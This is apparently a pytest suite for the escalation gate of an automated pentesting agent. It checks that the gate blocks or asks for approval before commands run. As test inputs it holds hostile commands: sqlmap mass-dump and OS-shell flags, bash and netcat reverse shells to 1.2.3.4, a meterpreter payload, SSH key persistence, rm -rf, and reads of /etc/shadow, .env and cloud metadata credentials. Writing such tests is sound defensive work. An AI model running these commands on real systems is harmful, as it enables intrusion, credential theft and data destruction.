"""Tests for the impact-escalation gate (hackbot.core.escalation)."""

import pytest

from hackbot.core.escalation import EscalationLevel, classify
from hackbot.core.runner import ToolRunner

U = "'https://shop.example.com/item?id=1'"


class TestSqlInjectionEscalation:
    """After SQLi is proven, extraction is gated and minimised."""

    def test_proof_commands_need_nothing(self):
        assert classify(f"sqlmap -u {U} --batch --banner").level == EscalationLevel.NONE
        assert classify(f"sqlmap -u {U} --batch --current-user").level == EscalationLevel.NONE

    @pytest.mark.parametrize("flag", ["--dump-all", "-a", "--all", "--os-pwn", "--file-write"])
    def test_mass_extraction_and_takeover_blocked(self, flag):
        d = classify(f"sqlmap -u {U} --batch {flag}")
        assert d.level == EscalationLevel.BLOCK
        assert d.minimal_alternative

    def test_dump_without_table_blocked(self):
        d = classify(f"sqlmap -u {U} --batch --dump")
        assert d.level == EscalationLevel.BLOCK
        assert "--stop" in d.minimal_alternative

    def test_single_row_sample_needs_approval(self):
        d = classify(f"sqlmap -u {U} -D shop -T users --dump --start 1 --stop 1")
        assert d.level == EscalationLevel.APPROVAL
        assert "1 row" in d.reason
        assert "PII" in d.reason

    def test_unbounded_table_dump_flagged(self):
        d = classify(f"sqlmap -u {U} -T orders --dump")
        assert d.level == EscalationLevel.APPROVAL
        assert "no row limit" in d.reason

    def test_sample_larger_than_limit_flagged(self):
        d = classify(f"sqlmap -u {U} -T logs --dump --start 1 --stop 50", sample_limit=1)
        assert "50 rows > sample limit 1" in d.reason

    @pytest.mark.parametrize(
        "flag", ["--passwords", "--os-shell", "--os-cmd=id", "--file-read=/etc/passwd"],
    )
    def test_post_exploitation_needs_approval(self, flag):
        assert classify(f"sqlmap -u {U} {flag}").level == EscalationLevel.APPROVAL

    def test_risk_3_needs_approval(self):
        d = classify(f"sqlmap -u {U} --risk 3 --level 5")
        assert d.level == EscalationLevel.APPROVAL
        assert d.category == "state_change"


class TestRceEscalation:
    @pytest.mark.parametrize("cmd", [
        "curl 'https://x.example.com/run?c=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'",
        "curl https://x.example.com/run --data-urlencode 'c=nc -e /bin/sh 1.2.3.4 4444'",
        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.2.3.4",
        "curl https://x.example.com/run -d 'c=echo key >> ~/.ssh/authorized_keys'",
        "curl https://x.example.com/run -d 'c=rm -rf /var/www'",
    ])
    def test_shells_persistence_destruction_blocked(self, cmd):
        assert classify(cmd).level == EscalationLevel.BLOCK

    @pytest.mark.parametrize("cmd", [
        "curl 'https://x.example.com/run?c=cat%20/etc/shadow'",
        "curl https://x.example.com/view?f=../../home/app/.ssh/id_rsa",
        "curl https://x.example.com/fetch?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
        "curl https://x.example.com/view?f=../../.env",
    ])
    def test_secret_reads_need_approval(self, cmd):
        d = classify(cmd)
        assert d.level == EscalationLevel.APPROVAL
        assert d.category == "sensitive_data"
        assert "id" in d.minimal_alternative

    @pytest.mark.parametrize("cmd", [
        "curl https://x.example.com/run -d 'c=crontab -r'",
        "curl https://x.example.com/run -d 'c=useradd backdoor'",
    ])
    def test_possible_persistence_needs_approval(self, cmd):
        assert classify(cmd).level == EscalationLevel.APPROVAL

    def test_endpoint_names_are_not_persistence(self):
        assert classify("curl -s https://api.example.com/api/adduser").level == EscalationLevel.NONE

    def test_harmless_rce_proof_needs_nothing(self):
        assert classify("curl 'https://x.example.com/run?c=id'").level == EscalationLevel.NONE


class TestOtherCategories:
    @pytest.mark.parametrize("cmd", [
        "curl -X DELETE https://api.example.com/users/2",
        "curl -X PUT https://api.example.com/users/2 -d '{}'",
        "curl -d 'email=a@b.c' https://api.example.com/profile",
        "http PATCH https://api.example.com/users/2 role=admin",
    ])
    def test_state_changing_requests_need_approval(self, cmd):
        assert classify(cmd).category == "state_change"

    def test_get_is_not_gated(self):
        assert classify("curl -s https://api.example.com/users/2").level == EscalationLevel.NONE

    def test_bruteforce_needs_approval(self):
        d = classify("hydra -L users.txt -P pass.txt ssh://example.com")
        assert d.category == "credential_attack"

    @pytest.mark.parametrize("cmd", [
        "masscan 10.0.0.0/24 -p1-65535 --rate 100000",
        "nmap -T5 example.com",
        "ffuf -u https://example.com/FUZZ -w w.txt -t 500",
    ])
    def test_heavy_load_needs_approval(self, cmd):
        assert classify(cmd).category == "load"

    def test_normal_recon_not_gated(self):
        for cmd in ("nmap -sV example.com", "ffuf -u https://example.com/FUZZ -w w.txt -t 40",
                    "nuclei -u https://example.com -severity high"):
            assert classify(cmd).level == EscalationLevel.NONE


# ── ToolRunner integration ───────────────────────────────────────────────────


class _FakePopen:
    calls = []

    def __init__(self, argv, **kwargs):
        _FakePopen.calls.append(argv)
        self.returncode = 0

    def communicate(self, input=None, timeout=None):
        return ("ok", "")


@pytest.fixture
def fake_popen(monkeypatch):
    _FakePopen.calls = []
    monkeypatch.setattr("hackbot.core.runner.subprocess.Popen", _FakePopen)
    return _FakePopen


def _runner(**kw):
    return ToolRunner(allowed_tools=["sqlmap", "curl"], safe_mode=True, **kw)


class TestRunnerGate:
    def test_block_cannot_be_approved(self, fake_popen):
        r = _runner(auto_confirm=True, on_approve=lambda c, why: True)
        res = r.execute(f"sqlmap -u {U} --dump-all --batch")
        assert "ESCALATION BLOCKED" in res.stderr
        assert fake_popen.calls == []

    def test_auto_confirm_cannot_approve_escalation(self, fake_popen):
        r = _runner(auto_confirm=True, on_confirm=lambda c, why: True)
        res = r.execute(f"sqlmap -u {U} -T users --dump --start 1 --stop 1 --batch")
        assert "NOT APPROVED" in res.stderr
        assert res.return_code == -2
        assert fake_popen.calls == []

    def test_human_decline(self, fake_popen):
        prompts = []
        r = _runner(on_approve=lambda c, why: prompts.append(why) or False)
        res = r.execute("curl -X DELETE https://api.example.com/users/2")
        assert not res.success
        assert "Minimal proof instead" in prompts[0]
        assert fake_popen.calls == []

    def test_human_approval_runs_once_without_second_risky_prompt(self, fake_popen):
        prompts = []
        r = _runner(on_approve=lambda c, why: prompts.append(why) or True,
                    on_confirm=lambda c, why: prompts.append(why) or True)
        res = r.execute(f"sqlmap -u {U} -T users --dump --start 1 --stop 1 --batch")
        assert res.success
        assert len(prompts) == 1  # the escalation prompt, not also a RISKY prompt

    def test_gate_can_be_disabled(self, fake_popen):
        r = _runner(escalation_gate=False)
        assert r.execute("curl -X DELETE https://api.example.com/users/2").success
